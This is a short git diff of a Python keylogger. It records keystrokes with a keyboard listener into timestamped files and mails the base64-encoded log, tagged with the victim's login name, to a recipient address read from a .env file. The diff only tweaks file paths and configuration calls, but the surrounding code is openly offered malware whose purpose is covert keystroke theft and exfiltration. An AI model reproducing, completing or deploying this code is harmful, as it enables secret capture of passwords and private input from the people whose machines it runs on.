@@ -8,7 +8,7 @@ import time
 class Keylogger:
     def __init__(self):
         print("Keylogger initiated")
-        self.filename = str(f"FILE-{str(time.strftime("%Y-%m-%d-%H-%M"))}.txt")
+        self.filename = str(f"files/FILE-{str(time.strftime("%Y-%m-%d-%H-%M"))}.txt")
         with keyboard.Listener(on_press=self.on_press,on_release=self.on_release) as listener:
             listener.join()
             
@@ -60,12 +60,12 @@ if __name__ == '__main__':
         print(b64content)
     file.close()
     data = {
-        "FromEmail": str(get_key("FROM")),
+        "FromEmail": str(get_key(dotenv_path=".env",key_to_get="FROM")),
     "FromName": "Ali hassan",
     "Subject": f"Keylogger File - SENT AT : {str(time.strftime("%Y-%m-%d-%H-%M-%S"))}",
     "Text-part": f"This is the file containing the key strokes from the PC {loginName if loginName else "loginNotFound"}",
     "Html-part": '<h1>Happy Hacking, Agent Twilight!</h1>',
-    "Recipients": [{"Email": str(get_key("RECIPIENT"))}],
+    "Recipients": [{"Email": str(get_key(dotenv_path=".env",key_to_get="RECIPIENT"))}],
     "Attachments": [
 								{
 										"ContentType": "text/plain",
